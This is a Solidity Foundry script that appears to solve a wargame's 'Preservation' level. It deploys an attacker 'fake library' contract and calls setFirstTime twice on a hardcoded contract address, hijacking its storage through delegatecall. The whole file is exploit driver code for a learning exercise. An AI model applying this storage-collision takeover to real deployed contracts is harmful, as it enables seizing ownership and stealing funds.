// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {PreservationHacker} from "../src/PreservationHacker.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

contract PreservationHackerTest is Script {

  function setUp() public {}

  function run() public {
    vm.startBroadcast();
    Preservation preservation = Preservation(0x974110593f3e8488203399cE8d5C4cB79B195737);
    PreservationHacker fakeLibrary = new PreservationHacker();
    uint256 fakeLibAddrAsUint = uint256(uint160(address(fakeLibrary)));
    preservation.setFirstTime(fakeLibAddrAsUint);
    preservation.setFirstTime(0);
    vm.stopBroadcast();
  }
}